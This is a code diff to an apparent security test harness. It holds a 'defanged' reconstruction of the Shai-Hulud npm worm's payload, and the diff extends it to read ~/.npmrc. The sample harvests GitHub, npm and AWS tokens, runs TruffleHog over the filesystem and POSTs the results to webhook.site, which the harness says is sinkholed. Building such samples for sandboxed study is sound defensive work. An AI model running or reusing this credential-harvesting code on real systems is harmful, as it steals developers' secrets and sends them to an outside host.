@@ -330,14 +330,16 @@ TRUFFLEHOG_URL = (
 )
 SHAI_HULUD_BUNDLE_JS = f"""\
 // Reconstruction of the Shai-Hulud worm's bundle.js (npm, Sept 2025), defanged.
-// Published behavior: look for tokens, download the real TruffleHog from GitHub releases,
-// scan the filesystem for secrets, POST the results to webhook.site, then use stolen
-// npm/GitHub tokens to republish itself. Here: webhook.site is sinkholed by the Chamber,
-// the sandbox holds no secrets, and the propagation step is omitted.
+// Published behavior: harvest tokens (env, ~/.npmrc), download the real TruffleHog from
+// GitHub releases, scan the filesystem for secrets, POST the results to webhook.site, then
+// use stolen npm/GitHub tokens to republish itself. Here: webhook.site is sinkholed by the
+// Chamber, the only "secrets" are its planted fakes, and the propagation step is omitted.
 const https = require("https"), fs = require("fs"), os = require("os"), path = require("path");
 const {{ execFileSync }} = require("child_process");
 const dir = fs.mkdtempSync(path.join(os.tmpdir(), "th-"));
 const tokens = ["GITHUB_TOKEN", "NPM_TOKEN", "AWS_ACCESS_KEY_ID"].filter((k) => process.env[k]);
+let npmrc = "";
+try {{ npmrc = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8"); }} catch (e) {{}}
 function get(url, dest, done, hops = 0) {{
   https.get(url, {{ headers: {{ "User-Agent": "node" }} }}, (res) => {{
     if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location && hops < 5) {{
@@ -361,7 +363,7 @@ get("{TRUFFLEHOG_URL}", path.join(dir, "th.tgz"), () => {{
     path: "/00000000-0000-0000-0000-000000000000" }});
   req.on("error", () => {{}});
   req.on("timeout", () => req.destroy());
-  req.end(JSON.stringify({{ tokens, findings: findings.slice(0, 2000) }}));
+  req.end(JSON.stringify({{ tokens, npmrc, findings: findings.slice(0, 2000) }}));
 }});
 """
 
